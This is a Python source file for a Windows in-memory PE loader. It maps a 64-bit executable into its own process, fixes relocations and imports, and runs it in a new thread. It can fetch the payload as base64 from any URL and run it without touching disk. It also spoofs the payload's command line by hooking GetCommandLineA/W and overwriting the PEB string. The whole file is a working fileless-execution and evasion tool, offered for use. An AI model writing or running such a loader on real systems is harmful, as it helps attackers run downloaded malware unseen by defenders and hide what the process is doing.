import ctypes
import struct
import sys
import base64

k32 = ctypes.windll.kernel32

k32.VirtualAlloc.restype = ctypes.c_void_p
k32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32]
k32.VirtualProtect.restype = ctypes.c_bool
k32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)]
k32.LoadLibraryA.restype = ctypes.c_void_p
k32.LoadLibraryA.argtypes = [ctypes.c_char_p]
k32.GetProcAddress.restype = ctypes.c_void_p
k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
k32.CreateThread.restype = ctypes.c_void_p
k32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_uint32]
k32.FlushInstructionCache.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
k32.GetCurrentProcess.restype = ctypes.c_void_p

MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000

_PROT = {
    (0,0,0): 0x01, (0,1,0): 0x02, (0,0,1): 0x04, (0,1,1): 0x04,
    (1,0,0): 0x10, (1,1,0): 0x20, (1,0,1): 0x40, (1,1,1): 0x40,
}

# --- IAT hooks for command line spoofing ---
_iat_hooks = {}
_hook_refs = []

def _setup_cmdline_hooks(cmdline):
    raw_a = cmdline.encode('ascii') + b'\x00'
    raw_w = cmdline.encode('utf-16-le') + b'\x00\x00'

    buf_a = k32.VirtualAlloc(None, len(raw_a), MEM_COMMIT | MEM_RESERVE, 0x04)
    ctypes.memmove(buf_a, raw_a, len(raw_a))
    buf_w = k32.VirtualAlloc(None, len(raw_w), MEM_COMMIT | MEM_RESERVE, 0x04)
    ctypes.memmove(buf_w, raw_w, len(raw_w))

    @ctypes.WINFUNCTYPE(ctypes.c_void_p)
    def hook_a():
        return buf_a

    @ctypes.WINFUNCTYPE(ctypes.c_void_p)
    def hook_w():
        return buf_w

    _hook_refs.extend([hook_a, hook_w])
    _iat_hooks[b'GetCommandLineA'] = ctypes.cast(hook_a, ctypes.c_void_p).value
    _iat_hooks[b'GetCommandLineW'] = ctypes.cast(hook_w, ctypes.c_void_p).value


# --- PE helpers ---
def _rd(addr, n):
    return bytes((ctypes.c_char * n).from_address(addr))

def _wr(addr, data):
    ctypes.memmove(addr, data, len(data))

def _u16(b, o=0): return struct.unpack_from('<H', b, o)[0]
def _u32(b, o=0): return struct.unpack_from('<I', b, o)[0]
def _u64(b, o=0): return struct.unpack_from('<Q', b, o)[0]


def map_pe(data):
    assert data[:2] == b'MZ'
    e_lfanew    = _u32(data, 0x3C)
    coff        = e_lfanew + 4
    num_sec     = _u16(data, coff + 2)
    opt_sz      = _u16(data, coff + 16)
    opt         = coff + 20
    assert _u16(data, opt) == 0x20B, "PE32+ only"

    ep_rva      = _u32(data, opt + 16)
    image_base  = _u64(data, opt + 24)
    size_image  = _u32(data, opt + 56)
    size_hdr    = _u32(data, opt + 60)
    num_dd      = _u32(data, opt + 108)
    dd_off      = opt + 112
    dd = [(_u32(data, dd_off+i*8), _u32(data, dd_off+i*8+4)) for i in range(min(num_dd, 16))]

    sec_off = opt + opt_sz
    sections = []
    for i in range(num_sec):
        o = sec_off + i * 40
        name  = data[o:o+8].rstrip(b'\x00')
        vs    = _u32(data, o+8)
        va    = _u32(data, o+12)
        rs    = _u32(data, o+16)
        rp    = _u32(data, o+20)
        chars = _u32(data, o+36)
        sections.append((name, vs, va, rs, rp, chars))

    base = k32.VirtualAlloc(None, size_image, MEM_COMMIT | MEM_RESERVE, 0x40)
    if not base:
        raise OSError(f"VirtualAlloc({hex(size_image)}) failed")

    ctypes.memmove(base, data[:size_hdr], size_hdr)
    for _, vs, va, rs, rp, _ in sections:
        if rs:
            ctypes.memmove(base + va, data[rp:rp + rs], rs)

    delta = base - image_base
    if delta and len(dd) > 5 and dd[5][0]:
        _reloc(base, dd[5][0], dd[5][1], delta)

    if len(dd) > 1 and dd[1][0]:
        _imports(base, dd[1][0])

    k32.FlushInstructionCache(k32.GetCurrentProcess(), ctypes.c_void_p(base), size_image)

    for _, vs, va, rs, rp, ch in sections:
        x = bool(ch & 0x20000000)
        r = bool(ch & 0x40000000)
        w = bool(ch & 0x80000000)
        prot = _PROT.get((int(x), int(r), int(w)), 0x04)
        old = ctypes.c_uint32()
        k32.VirtualProtect(ctypes.c_void_p(base + va), max(vs, 1), prot, ctypes.byref(old))

    return base, ep_rva


def _reloc(base, rva, size, delta):
    pos = 0
    while pos < size:
        blk = _rd(base + rva + pos, 8)
        page_rva, blk_sz = _u32(blk), _u32(blk, 4)
        if blk_sz < 8:
            break
        n = (blk_sz - 8) // 2
        entries = _rd(base + rva + pos + 8, n * 2)
        for i in range(n):
            e = _u16(entries, i * 2)
            t, off = e >> 12, e & 0xFFF
            if t == 10:
                addr = base + page_rva + off
                val = _u64(_rd(addr, 8))
                _wr(addr, struct.pack('<Q', (val + delta) & 0xFFFFFFFFFFFFFFFF))
        pos += blk_sz


def _imports(base, import_rva):
    pos = 0
    while True:
        desc = _rd(base + import_rva + pos, 20)
        ilt_rva  = _u32(desc, 0)
        name_rva = _u32(desc, 12)
        iat_rva  = _u32(desc, 16)
        if not name_rva:
            break

        dll = ctypes.string_at(base + name_rva)
        hmod = k32.LoadLibraryA(dll)
        if not hmod:
            raise OSError(f"LoadLibrary({dll}) failed")

        lookup = ilt_rva or iat_rva
        off = 0
        while True:
            thunk = _u64(_rd(base + lookup + off, 8))
            if not thunk:
                break
            if thunk & (1 << 63):
                ordinal = thunk & 0xFFFF
                proc = k32.GetProcAddress(hmod, ctypes.cast(ctypes.c_void_p(ordinal), ctypes.c_char_p))
            else:
                fname = ctypes.string_at(base + (thunk & 0x7FFFFFFF) + 2)
                if fname in _iat_hooks:
                    proc = _iat_hooks[fname]
                else:
                    proc = k32.GetProcAddress(hmod, fname)
            if not proc:
                raise OSError(f"GetProcAddress failed for import in {dll}")
            _wr(base + iat_rva + off, struct.pack('<Q', proc))
            off += 8
        pos += 20


def run(pe_data, cmdline=None):
    if cmdline:
        _setup_cmdline_hooks(cmdline)
        _patch_peb_cmdline(cmdline)
        print(f"[+] Command line spoofed: \"{cmdline}\"")

    base, ep_rva = map_pe(pe_data)
    entry = base + ep_rva
    print(f"[+] Mapped at {hex(base)}, entry at {hex(entry)}")

    EP = ctypes.CFUNCTYPE(ctypes.c_uint32, ctypes.c_void_p)
    fn = EP(entry)
    tid = ctypes.c_uint32()
    ht = k32.CreateThread(None, 0x800000, fn, None, 0, ctypes.byref(tid))
    if not ht:
        raise OSError("CreateThread failed")
    print(f"[+] Thread {tid.value} running")
    k32.WaitForSingleObject(ht, 0xFFFFFFFF)
    k32.CloseHandle(ht)


def _patch_peb_cmdline(cmdline):
    ntdll = ctypes.windll.ntdll
    ntdll.NtQueryInformationProcess.argtypes = [
        ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p,
        ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)
    ]
    ntdll.NtQueryInformationProcess.restype = ctypes.c_int32

    class PBI(ctypes.Structure):
        _fields_ = [("R1", ctypes.c_void_p), ("PebBaseAddress", ctypes.c_void_p),
                     ("R2", ctypes.c_void_p * 2), ("Pid", ctypes.c_void_p),
                     ("R3", ctypes.c_void_p)]

    pbi = PBI()
    ntdll.NtQueryInformationProcess(
        k32.GetCurrentProcess(), 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None
    )
    peb = pbi.PebBaseAddress
    params_ptr = _u64(_rd(peb + 0x20, 8))

    # Read existing CommandLine UNICODE_STRING {Length, MaxLength, pad, Buffer}
    existing_max = _u16(_rd(params_ptr + 0x72, 2))
    existing_buf = _u64(_rd(params_ptr + 0x78, 8))

    cmdline_w = cmdline.encode('utf-16-le') + b'\x00\x00'
    new_len = len(cmdline_w) - 2

    if len(cmdline_w) <= existing_max and existing_buf:
        # Overwrite the existing buffer IN PLACE (most reliable —
        # GetCommandLineW returns this exact pointer, nothing caches contents)
        ctypes.memmove(existing_buf, cmdline_w, len(cmdline_w))
        # Zero out any trailing bytes from the old string
        if len(cmdline_w) < existing_max:
            rem = existing_max - len(cmdline_w)
            ctypes.memset(existing_buf + len(cmdline_w), 0, rem)
        # Update Length (keep MaxLength and Buffer unchanged)
        _wr(params_ptr + 0x70, struct.pack('<H', new_len))
    else:
        # New string is longer — allocate fresh buffer and swap pointer
        buf = k32.VirtualAlloc(None, len(cmdline_w), MEM_COMMIT | MEM_RESERVE, 0x04)
        ctypes.memmove(buf, cmdline_w, len(cmdline_w))
        _wr(params_ptr + 0x70, struct.pack('<HHI', new_len, new_len + 2, 0) + struct.pack('<Q', buf))


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <url | file | --b64 str> [-- pe_args...]")
        sys.exit(1)

    if '--' in sys.argv:
        sep = sys.argv.index('--')
        loader_args = sys.argv[1:sep]
        pe_args = sys.argv[sep+1:]
    else:
        loader_args = sys.argv[1:]
        pe_args = []

    arg = loader_args[0]
    if arg == '--b64':
        pe_data = base64.b64decode(loader_args[1])
    elif arg.startswith('http://') or arg.startswith('https://'):
        import urllib.request
        resp = urllib.request.urlopen(arg)
        pe_data = base64.b64decode(resp.read())
        print(f"[+] Fetched {len(pe_data)} bytes from {arg}")
    else:
        with open(arg, 'rb') as f:
            pe_data = f.read()

    cmdline = None
    if pe_args:
        # Use --name to override argv[0], otherwise default to "app.exe"
        exe_name = 'app.exe'
        if '--name' in loader_args:
            ni = loader_args.index('--name')
            exe_name = loader_args[ni + 1]
        cmdline = exe_name + ' ' + ' '.join(pe_args)

    run(pe_data, cmdline)
